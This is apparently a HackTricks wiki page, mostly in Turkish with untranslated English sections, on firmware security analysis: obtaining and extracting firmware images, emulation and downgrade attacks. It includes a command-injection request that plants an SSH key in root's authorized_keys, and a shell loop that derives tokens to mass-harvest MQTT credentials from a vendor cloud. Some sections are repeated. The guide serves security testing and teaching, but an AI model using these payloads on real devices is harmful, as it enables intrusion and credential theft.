# Firmware Analizi

{{#include ../../banners/hacktricks-training.md}}

## **Giriş**

### İlgili kaynaklar


{{#ref}}
synology-encrypted-archive-decryption.md
{{#endref}}

{{#ref}}
../../network-services-pentesting/32100-udp-pentesting-pppp-cs2-p2p-cameras.md
{{#endref}}

{{#ref}}
android-mediatek-secure-boot-bl2_ext-bypass-el3.md
{{#endref}}

{{#ref}}
mediatek-xflash-carbonara-da2-hash-bypass.md
{{#endref}}

Firmware, donanım bileşenleri ile kullanıcıların etkileşimde bulunduğu yazılım arasındaki iletişimi yönetip kolaylaştırarak cihazların doğru şekilde çalışmasını sağlayan temel yazılımdır. Kalıcı bellekte depolanır; bu sayede cihaz güç verildiğinde hayati talimatlara erişir ve işletim sisteminin başlatılmasını sağlar. Firmware'i incelemek ve potansiyel olarak değiştirmek, güvenlik açıklarını belirlemede kritik bir adımdır.

## **Bilgi Toplama**

**Bilgi toplama**, bir cihazın yapısını ve kullandığı teknolojileri anlamada kritik bir ilk adımdır. Bu süreç şunların toplanmasını içerir:

- CPU mimarisi ve üzerinde çalışan işletim sistemi
- Bootloader detayları
- Donanım yerleşimi ve teknik veri sayfaları
- Kod tabanı metrikleri ve kaynak konumları
- Harici kütüphaneler ve lisans tipleri
- Güncelleme geçmişleri ve düzenleyici sertifikasyonlar
- Mimari ve akış diyagramları
- Güvenlik değerlendirmeleri ve tespit edilen açıklar

Bu amaçla, **open-source intelligence (OSINT)** araçları paha biçilmezdir; ayrıca mevcut açık kaynak yazılım bileşenlerinin elle ve otomatik inceleme süreçleriyle analizi de önemlidir. [Coverity Scan](https://scan.coverity.com) ve [Semmle’s LGTM](https://lgtm.com/#explore) gibi araçlar, potansiyel sorunları tespit etmek için kullanılabilecek ücretsiz statik analiz sunar.

## **Firmware Edinme**

Firmware elde etmek farklı yollarla gerçekleştirilebilir; her birinin kendine özgü zorluk seviyesi vardır:

- **Doğrudan** kaynaktan (geliştiriciler, üreticiler)
- Sağlanan talimatlardan **derleyerek**
- Resmi destek sitelerinden **indirerek**
- Barındırılan firmware dosyalarını bulmak için **Google dork** sorgularını kullanarak
- [S3Scanner](https://github.com/sa7mon/S3Scanner) gibi araçlarla **cloud storage**'a doğrudan erişim
- Man-in-the-middle teknikleriyle güncellemeleri yakalayarak
- Cihazdan **UART**, **JTAG** veya **PICit** gibi bağlantılar aracılığıyla çıkararak
- Cihaz iletişimi içinde güncelleme isteklerini **Sniffing** ile yakalayarak
- **Hardcoded update endpoints**'leri tespit edip kullanarak
- Bootloader'dan veya ağdan **dumping** yaparak
- Diğer tüm yöntemler başarısız olduğunda, uygun donanım araçları kullanarak depolama yongasını söküp okuyarak

## Firmware'i Analiz Etme

Artık firmware'e sahip olduğunuza göre, nasıl işlem yapacağınızı bilmek için ondan bilgi çıkarmanız gerekir. Bunun için kullanabileceğiniz çeşitli araçlar:
```bash
file <bin>
strings -n8 <bin>
strings -tx <bin> #print offsets in hex
hexdump -C -n 512 <bin> > hexdump.out
hexdump -C <bin> | head # might find signatures in header
fdisk -lu <bin> #lists a drives partition and filesystems if multiple
```
Eğer bu araçlarla çok şey bulamıyorsanız görüntünün **entropy**'sini `binwalk -E <bin>` ile kontrol edin; entropy düşükse muhtemelen şifrelenmemiştir. Entropy yüksekse, muhtemelen şifrelenmiştir (veya bir şekilde sıkıştırılmıştır).

Ayrıca, bu araçları kullanarak **firmware içinde gömülü dosyaları** çıkarabilirsiniz:


{{#ref}}
../../generic-methodologies-and-resources/basic-forensic-methodology/partitions-file-systems-carving/file-data-carving-recovery-tools.md
{{#endref}}

Veya dosyayı incelemek için [**binvis.io**](https://binvis.io/#/) ([code](https://code.google.com/archive/p/binvis/)) kullanabilirsiniz.

### Filesystem'i Elde Etme

Önceki bahsedilen araçlarla, ör. `binwalk -ev <bin>` kullanarak **filesystem'i çıkarabilmiş** olmalısınız.\
Binwalk genellikle bunu **filesystem türü adını taşıyan bir klasörün içinde** çıkarır; bu genellikle aşağıdakilerden biridir: squashfs, ubifs, romfs, rootfs, jffs2, yaffs2, cramfs, initramfs.

#### Manuel Filesystem Çıkarma

Bazen binwalk'ın imzalarında **filesystem'in magic byte'ı olmayabilir**. Bu durumlarda, binwalk'ı kullanarak **filesystem'in offset'ini bulun ve ikili dosyadan sıkıştırılmış filesystem'i carve edin** ve aşağıdaki adımları kullanarak filesystem'i türüne göre **elle çıkarın**.
```
$ binwalk DIR850L_REVB.bin

DECIMAL HEXADECIMAL DESCRIPTION
----------------------------------------------------------------------------- ---

0 0x0 DLOB firmware header, boot partition: """"dev=/dev/mtdblock/1""""
10380 0x288C LZMA compressed data, properties: 0x5D, dictionary size: 8388608 bytes, uncompressed size: 5213748 bytes
1704052 0x1A0074 PackImg section delimiter tag, little endian size: 32256 bytes; big endian size: 8257536 bytes
1704084 0x1A0094 Squashfs filesystem, little endian, version 4.0, compression:lzma, size: 8256900 bytes, 2688 inodes, blocksize: 131072 bytes, created: 2016-07-12 02:28:41
```
Squashfs filesystem'ini carve etmek için aşağıdaki **dd command**'i çalıştırın.
```
$ dd if=DIR850L_REVB.bin bs=1 skip=1704084 of=dir.squashfs

8257536+0 records in

8257536+0 records out

8257536 bytes (8.3 MB, 7.9 MiB) copied, 12.5777 s, 657 kB/s
```
Alternatively, the following command could also be run.

`$ dd if=DIR850L_REVB.bin bs=1 skip=$((0x1A0094)) of=dir.squashfs`

- For squashfs (used in the example above)

`$ unsquashfs dir.squashfs`

Files will be in "`squashfs-root`" directory afterwards.

- CPIO archive files

`$ cpio -ivd --no-absolute-filenames -F <bin>`

- For jffs2 filesystems

`$ jefferson rootfsfile.jffs2`

- For ubifs filesystems with NAND flash

`$ ubireader_extract_images -u UBI -s <start_offset> <bin>`

`$ ubidump.py <bin>`

## Analyzing Firmware

Once the firmware is obtained, it's essential to dissect it for understanding its structure and potential vulnerabilities. This process involves utilizing various tools to analyze and extract valuable data from the firmware image.

### Initial Analysis Tools

A set of commands is provided for initial inspection of the binary file (referred to as `<bin>`). These commands help in identifying file types, extracting strings, analyzing binary data, and understanding the partition and filesystem details:
```bash
file <bin>
strings -n8 <bin>
strings -tx <bin> #prints offsets in hexadecimal
hexdump -C -n 512 <bin> > hexdump.out
hexdump -C <bin> | head #useful for finding signatures in the header
fdisk -lu <bin> #lists partitions and filesystems, if there are multiple
```
İmajın şifreleme durumunu değerlendirmek için, **entropi** `binwalk -E <bin>` ile kontrol edilir. Düşük entropi şifreleme eksikliğine işaret ederken, yüksek entropi olası şifreleme veya sıkıştırmayı gösterir.

Gömülü dosyaları çıkarmak için, dosya inceleme amacıyla **file-data-carving-recovery-tools** dokümantasyonu ve **binvis.io** gibi araçlar ve kaynaklar önerilir.

### Dosya Sistemini Çıkarma

`binwalk -ev <bin>` kullanılarak genellikle dosya sistemi çıkarılabilir; genellikle dosya sistemi türünün adını taşıyan bir dizine (ör. squashfs, ubifs) çıkarılır. Ancak **binwalk** magic baytlarının eksikliği nedeniyle dosya sistemi türünü tanıyamadığında, manuel çıkarma gerekir. Bu, dosya sisteminin offset'ini bulmak için `binwalk` kullanmayı ve ardından dosya sistemini carve etmek için `dd` komutunu çalıştırmayı içerir:
```bash
$ binwalk DIR850L_REVB.bin

$ dd if=DIR850L_REVB.bin bs=1 skip=1704084 of=dir.squashfs
```
Daha sonra, dosya sistemi türüne (ör. squashfs, cpio, jffs2, ubifs) bağlı olarak içeriği elle çıkarmak için farklı komutlar kullanılır.

### Dosya Sistemi Analizi

Dosya sistemi çıkarıldıktan sonra güvenlik açıklarının araştırılması başlar. Özellikle insecure network daemons, hardcoded credentials, API endpoints, update server functionalities, uncompiled code, startup scripts ve çevrimdışı analiz için compiled binaries'e dikkat edilir.

**Anahtar konumlar** ve **incelenecek öğeler** şunlardır:

- **etc/shadow** ve **etc/passwd** (kullanıcı kimlik bilgileri için)
- SSL sertifikaları ve anahtarları **etc/ssl** içinde
- Potansiyel zafiyetler için yapılandırma ve script dosyaları
- Daha ileri analiz için gömülü ikili dosyalar
- Yaygın IoT cihaz web sunucuları ve ikili dosyalar

Dosya sistemi içindeki hassas bilgi ve zafiyetleri ortaya çıkarmada yardımcı birkaç araç:

- [**LinPEAS**](https://github.com/carlospolop/PEASS-ng) and [**Firmwalker**](https://github.com/craigz28/firmwalker) for sensitive information search
- [**The Firmware Analysis and Comparison Tool (FACT)**](https://github.com/fkie-cad/FACT_core) for comprehensive firmware analysis
- [**FwAnalyzer**](https://github.com/cruise-automation/fwanalyzer), [**ByteSweep**](https://gitlab.com/bytesweep/bytesweep), [**ByteSweep-go**](https://gitlab.com/bytesweep/bytesweep-go), and [**EMBA**](https://github.com/e-m-b-a/emba) for static and dynamic analysis

### Derlenmiş İkili Dosyalar Üzerinde Güvenlik Kontrolleri

Dosya sisteminde bulunan hem kaynak kodu hem de derlenmiş ikili dosyalar zafiyetler için dikkatle incelenmelidir. Unix ikili dosyaları için **checksec.sh** ve Windows ikili dosyaları için **PESecurity** gibi araçlar, istismar edilebilecek korunmasız ikili dosyaları tespit etmeye yardımcı olur.

## Türetilmiş URL token'ları ile bulut konfigürasyonu ve MQTT kimlik bilgilerinin toplanması

Birçok IoT hub'ı, cihaz başına konfigürasyonunu şu görünüme sahip bir bulut endpoint'inden çeker:

- `https://<api-host>/pf/<deviceId>/<token>`

Firmware analizinde `<token>`'ın cihaz ID'si ve hardcoded bir secret kullanılarak yerel olarak türetildiğini görebilirsiniz, örneğin:

- token = MD5( deviceId || STATIC_KEY ) and represented as uppercase hex

Bu tasarım, deviceId ve STATIC_KEY'i bilen herhangi birinin URL'i yeniden oluşturup bulut konfigürasyonunu çekmesine izin verir; bu genellikle düz metin MQTT kimlik bilgilerini ve konu öneklerini ortaya çıkarır.

Pratik iş akışı:

1) UART boot loglarından deviceId'i çıkarın

- 3.3V UART adaptörü (TX/RX/GND) bağlayın ve logları yakalayın:
```bash
picocom -b 115200 /dev/ttyUSB0
```
- cloud config URL pattern ve broker address'i yazdıran satırları arayın, örneğin:
```
Online Config URL https://api.vendor.tld/pf/<deviceId>/<token>
MQTT: mqtt://mq-gw.vendor.tld:8001
```
2) Firmware'den STATIC_KEY ve token algoritmasını kurtarın

- İkili dosyaları Ghidra/radare2'ye yükleyin ve config yolunu ("/pf/") veya MD5 kullanımını arayın.
- Algoritmayı doğrulayın (ör. MD5(deviceId||STATIC_KEY)).
- Token'ı Bash'te türetin ve digest'i büyük harfe çevirin:
```bash
DEVICE_ID="d88b00112233"
STATIC_KEY="cf50deadbeefcafebabe"
printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}'
```
3) Harvest cloud config and MQTT credentials

- URL'i oluşturun ve curl ile JSON'u çekin; jq ile ayrıştırıp secrets'i çıkarın:
```bash
API_HOST="https://api.vendor.tld"
TOKEN=$(printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}')
curl -sS "$API_HOST/pf/${DEVICE_ID}/${TOKEN}" | jq .
# Fields often include: mqtt host/port, clientId, username, password, topic prefix (tpkfix)
```
4) Düz metin MQTT ve zayıf topic ACL'lerini (varsa) kötüye kullanın

- Kurtarılan kimlik bilgilerini kullanarak bakım konularına abone olun ve hassas olayları arayın:
```bash
mosquitto_sub -h <broker> -p <port> -V mqttv311 \
-i <client_id> -u <username> -P <password> \
-t "<topic_prefix>/<deviceId>/admin" -v
```
5) Öngörülebilir cihaz kimliklerini listeleme (ölçekli, yetkilendirme ile)

- Birçok ekosistem satıcı OUI/product/type baytlarını ardışık bir son ekle birlikte gömer.
- Aday ID'leri yineleyebilir, tokenler türetebilir ve konfigürasyonları programlı olarak çekebilirsiniz:
```bash
API_HOST="https://api.vendor.tld"; STATIC_KEY="cf50deadbeef"; PREFIX="d88b1603" # OUI+type
for SUF in $(seq -w 000000 0000FF); do
DEVICE_ID="${PREFIX}${SUF}"
TOKEN=$(printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}')
curl -fsS "$API_HOST/pf/${DEVICE_ID}/${TOKEN}" | jq -r '.mqtt.username,.mqtt.password' | sed "/null/d" && echo "$DEVICE_ID"
done
```
Notlar
- mass enumeration denemeden önce her zaman açık yetki alın.
- Mümkünse hedef donanımı değiştirmeden secrets'i kurtarmak için emulation veya static analysis'i tercih edin.


Firmware emülasyonu süreci, bir cihazın işletimi veya tek bir programın **dynamic analysis**'ine olanak tanır. Bu yaklaşım donanım veya mimari bağımlılıklarla karşılaşabilir, ancak root filesystem'i veya belirli binaries'leri aynı architecture ve endianness'e sahip bir cihaza, örneğin Raspberry Pi'ye, veya önceden hazırlanmış bir virtual machine'e aktararak daha fazla test yapılmasını kolaylaştırabilirsiniz.

### Bireysel binaries'lerin Emülasyonu

Tek programları incelerken, programın endianness'inin ve CPU architecture'ının belirlenmesi kritiktir.

#### MIPS Architecture Örneği

MIPS architecture binary'yi emüle etmek için şu komut kullanılabilir:
```bash
file ./squashfs-root/bin/busybox
```
Ve gerekli emülasyon araçlarını yüklemek için:
```bash
sudo apt-get install qemu qemu-user qemu-user-static qemu-system-arm qemu-system-mips qemu-system-x86 qemu-utils
```
For MIPS (big-endian), `qemu-mips` is used, and for little-endian binaries, `qemu-mipsel` would be the choice.

#### ARM Architecture Emulation

For ARM binaries, the process is similar, with the `qemu-arm` emulator being utilized for emulation.

### Full System Emulation

Tools like [Firmadyne](https://github.com/firmadyne/firmadyne), [Firmware Analysis Toolkit](https://github.com/attify/firmware-analysis-toolkit), and others, facilitate full firmware emulation, automating the process and aiding in dynamic analysis.

## Dynamic Analysis in Practice

At this stage, either a real or emulated device environment is used for analysis. It's essential to maintain shell access to the OS and filesystem. Emulation may not perfectly mimic hardware interactions, necessitating occasional emulation restarts. Analysis should revisit the filesystem, exploit exposed webpages and network services, and explore bootloader vulnerabilities. Firmware integrity tests are critical to identify potential backdoor vulnerabilities.

## Runtime Analysis Techniques

Runtime analysis involves interacting with a process or binary in its operating environment, using tools like gdb-multiarch, Frida, and Ghidra for setting breakpoints and identifying vulnerabilities through fuzzing and other techniques.

## Binary Exploitation and Proof-of-Concept

Developing a PoC for identified vulnerabilities requires a deep understanding of the target architecture and programming in lower-level languages. Binary runtime protections in embedded systems are rare, but when present, techniques like Return Oriented Programming (ROP) may be necessary.

## Prepared Operating Systems for Firmware Analysis

Operating systems like [AttifyOS](https://github.com/adi0x90/attifyos) and [EmbedOS](https://github.com/scriptingxss/EmbedOS) provide pre-configured environments for firmware security testing, equipped with necessary tools.

## Prepared OSs to analyze Firmware

- [**AttifyOS**](https://github.com/adi0x90/attifyos): AttifyOS, Internet of Things (IoT) cihazlarının güvenlik değerlendirmesi ve penetration testing yapmanıza yardımcı olmak için tasarlanmış bir distro. Gerekli tüm araçların yüklü olduğu önceden yapılandırılmış bir ortam sağlayarak size çok zaman kazandırır.
- [**EmbedOS**](https://github.com/scriptingxss/EmbedOS): Ubuntu 18.04 tabanlı, firmware security testing araçlarıyla önceden yüklenmiş gömülü güvenlik test işletim sistemidir.

## Firmware Downgrade Attacks & Insecure Update Mechanisms

Even when a vendor implements cryptographic signature checks for firmware images, **version rollback (downgrade) protection is frequently omitted**. When the boot- or recovery-loader only verifies the signature with an embedded public key but does not compare the *version* (or a monotonic counter) of the image being flashed, an attacker can legitimately install an **older, vulnerable firmware that still bears a valid signature** and thus re-introduce patched vulnerabilities.

Typical attack workflow:

1. **Obtain an older signed image**
* Grab it from the vendor’s public download portal, CDN or support site.
* Extract it from companion mobile/desktop applications (e.g. inside an Android APK under `assets/firmware/`).
* Retrieve it from third-party repositories such as VirusTotal, Internet archives, forums, etc.
2. **Upload or serve the image to the device** via any exposed update channel:
* Web UI, mobile-app API, USB, TFTP, MQTT, etc.
* Many consumer IoT devices expose *unauthenticated* HTTP(S) endpoints that accept Base64-encoded firmware blobs, decode them server-side and trigger recovery/upgrade.
3. After the downgrade, exploit a vulnerability that was patched in the newer release (for example a command-injection filter that was added later).
4. Optionally flash the latest image back or disable updates to avoid detection once persistence is gained.

### Example: Command Injection After Downgrade
```http
POST /check_image_and_trigger_recovery?md5=1; echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC...' >> /root/.ssh/authorized_keys HTTP/1.1
Host: 192.168.0.1
Content-Type: application/octet-stream
Content-Length: 0
```
Zafiyetli (downgraded) firmware'de, `md5` parametresi herhangi bir sanitizasyon uygulanmadan doğrudan bir shell komutuna birleştiriliyor; bu da rastgele komut enjeksiyonuna izin veriyor (burada – enabling SSH key-based root access). Daha sonraki firmware sürümleri temel bir karakter filtresi getirdi, ancak downgrade korumasının olmaması bu düzeltmeyi etkisiz kılıyor.

### Mobil Uygulamalardan Firmware Çıkarma

Birçok üretici, uygulamanın cihazı Bluetooth/Wi‑Fi üzerinden güncelleyebilmesi için companion mobil uygulamalarının içine tam firmware imajları paketler. Bu paketler genellikle APK/APEX içinde `assets/fw/` veya `res/raw/` gibi yollar altında şifrelenmemiş olarak saklanır. `apktool`, `ghidra` veya hatta sade `unzip` gibi araçlar, fiziksel donanıma dokunmadan imzalı görüntüleri çekmenizi sağlar.
```
$ apktool d vendor-app.apk -o vendor-app
$ ls vendor-app/assets/firmware
firmware_v1.3.11.490_signed.bin
```
### Güncelleme Mantığını Değerlendirmek için Kontrol Listesi

* *update endpoint*'in taşıma/kimlik doğrulaması yeterince korunuyor mu (TLS + kimlik doğrulama)?
* Cihaz, flashing işleminden önce **version numbers** veya **monotonic anti-rollback counter** kontrolü yapıyor mu?
* İmaj secure boot chain içinde doğrulanıyor mu (ör. imzalar ROM code tarafından kontrol ediliyor mu)?
* userland code ek doğrulama/sanity kontrolleri yapıyor mu (ör. allowed partition map, model number)?
* *partial* veya *backup* update akışları aynı doğrulama mantığını yeniden kullanıyor mu?

> 💡  Yukarıdakilerden herhangi biri eksikse, platform muhtemelen rollback saldırılarına karşı savunmasızdır.

## Pratik yapmak için zafiyetli firmware

Pratik yaparken firmware'deki zayıflıkları keşfetmek için aşağıdaki vulnerable firmware projelerini başlangıç noktası olarak kullanın.

- OWASP IoTGoat
- [https://github.com/OWASP/IoTGoat](https://github.com/OWASP/IoTGoat)
- The Damn Vulnerable Router Firmware Project
- [https://github.com/praetorian-code/DVRF](https://github.com/praetorian-code/DVRF)
- Damn Vulnerable ARM Router (DVAR)
- [https://blog.exploitlab.net/2018/01/dvar-damn-vulnerable-arm-router.html](https://blog.exploitlab.net/2018/01/dvar-damn-vulnerable-arm-router.html)
- ARM-X
- [https://github.com/therealsaumil/armx#downloads](https://github.com/therealsaumil/armx#downloads)
- Azeria Labs VM 2.0
- [https://azeria-labs.com/lab-vm-2-0/](https://azeria-labs.com/lab-vm-2-0/)
- Damn Vulnerable IoT Device (DVID)
- [https://github.com/Vulcainreo/DVID](https://github.com/Vulcainreo/DVID)

## Referanslar

- [https://scriptingxss.gitbook.io/firmware-security-testing-methodology/](https://scriptingxss.gitbook.io/firmware-security-testing-methodology/)
- [Practical IoT Hacking: The Definitive Guide to Attacking the Internet of Things](https://www.amazon.co.uk/Practical-IoT-Hacking-F-Chantzis/dp/1718500904)
- [Exploiting zero days in abandoned hardware – Trail of Bits blog](https://blog.trailofbits.com/2025/07/25/exploiting-zero-days-in-abandoned-hardware/)


- [How a $20 Smart Device Gave Me Access to Your Home](https://bishopfox.com/blog/how-a-20-smart-device-gave-me-access-to-your-home)

## Eğitim ve Sertifika

- [https://www.attify-store.com/products/offensive-iot-exploitation](https://www.attify-store.com/products/offensive-iot-exploitation)

{{#include ../../banners/hacktricks-training.md}}
